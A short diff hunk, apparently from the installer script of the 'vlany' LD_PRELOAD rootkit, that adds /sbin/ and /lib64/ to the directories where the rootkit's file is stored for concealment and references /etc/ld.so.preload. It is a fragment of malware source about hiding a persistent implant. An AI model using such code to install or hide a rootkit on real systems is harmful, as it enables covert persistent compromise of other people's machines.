@@ -14,7 +14,7 @@ import string
 import subprocess
 
 LIB_DIRS = ["/lib/", "/lib32/", "/lib64/", "/libx32/"]
-P_DIRS = ["/bin/", "/etc/", "/home/", "/lib/", "/opt/", "/run/", "/sys/", "/usr/", "/var/"] # doesn't really matter where the file is stored since vlany hides it anyway but nothing like a little more obscurity
+P_DIRS = ["/bin/", "/sbin/", "/etc/", "/home/", "/lib/", "/lib64/", "/opt/", "/run/", "/sys/", "/usr/", "/var/"] # doesn't really matter where the file is stored since vlany hides it anyway but nothing like a little more obscurity
 
 O_PRELOAD = "/etc/ld.so.preload"
 
